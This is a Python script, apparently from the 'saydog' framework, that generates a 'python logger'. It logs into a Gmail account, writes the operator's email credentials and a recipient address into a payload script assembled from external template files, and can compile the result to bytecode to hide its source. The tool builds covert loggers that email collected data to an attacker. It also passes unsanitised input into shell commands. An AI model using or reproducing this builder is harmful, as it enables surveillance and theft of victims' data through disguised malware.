import os
import sys
import time
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

def menu():
        try:
                print (w)
                print (g+" PYTHON LOGGER"+w+" - by @saydog.official")
                print (w+"---------------------------------------------")
                print (w+"You must login using Google Account first")
                print (w+"because this methods using YAGMAIL")
                print (w+"---------------------------------------------")
                print (w)
                main()
        except KeyboardInterrupt:
                sys.exit(0)

def main():
        usr = str(input(b+"[+]"+w+" Your e-mail: "))
        pwd = getpass.getpass(b+"[+]"+w+" Password: ")
        print ("")
        try:
                print (b+"[+]"+w+" Trying to login as "+usr)
                msg = MIMEMultipart()
                msg['From'] = usr
                msg['To'] = usr
                msg['Subject'] = "SAYDOG-FRAMEWORK"
                body = "successfully login at python logger"
                test = usr
                msg.attach(MIMEText(body, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(usr, pwd)
                text = msg.as_string()
                server.sendmail(usr, test, text)
                server.quit()
        except smtplib.SMTPAuthenticationError:
                print ("")
                print (w+"["+r+"\033[0;30m\033[41m LOGIN FAILED \033[00m"+w+"]")
                print (r+"[!] username: "+w+usr)
                print (r+"[!] password: "+w+pwd)
                print ("")
                main()
        except TypeError:
                print (r+"[!ERROR] username or password not found")
                print ("")
                main()
        else:
                print (b+"[+]"+w+" Login as:- "+g+usr+w)
                print ("")
                to = str(input(b+"[+]"+w+" Receive e-mail "+w+": "))
                nfile = str(input(b+"[+]"+w+" Files name (ex: mylogger)"+w+": "))
                ofile = str(input(b+"[+]"+w+" save file to (ex: /sdcard)"+w+": "))
                print ("")
                print (b+"[+]"+w+" Generate python logger code")
                os.system("cat log1 > log.py;echo '"+'email = "'+usr+'"'+"' >> log.py;echo 'passw = "+'"'+pwd+'"'+"' >> log.py;echo 'to = "+'"'+to+'"'+"' >> log.py;cat log2 >> log.py;cat log.py > "+ofile+"/"+nfile+".py;rm log.py")
                time.sleep(5)
                print (b+"[+]"+w+" successfully generated python logger")
                print (b+"[+]"+w+" language using: python3.8")
                print (b+"[+]"+w+" requirements module: yagmail")
                print (b+"[+]"+w+" file saved as:- "+g+ofile+"/"+nfile+".py"+w)
                print ("")
                dog = str(input(w+"Do you want to hide the source code? (y/n) "))
                if dog == "y" or dog == "Y":
                        print ("")
                        print (b+"[+]"+w+" converting the source code")
                        time.sleep(3)
                        os.system("python3 -m py_compile "+ofile+"/"+nfile+".py;cat "+ofile+"/__pycache__/"+nfile+".cpython-38.pyc > "+ofile+"/"+nfile+".py;rm -rf "+ofile+"/__pycache__")
                        print (b+"[+]"+w+" python logger has been converted")
                        print ("")
                        dog = str(input(w+"[ enter ]"))
                        if dog == " ":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                else:
                        print ("")
                        dog = str(input(w+"[ enter ]"))
                        if dog == " ":
                                sys.exit(0)
                        else:
                                sys.exit(0)

if "__main__" == __name__:
    if "--genlogger-run" in sys.argv:
        menu()
    else:
            os.system("saydog")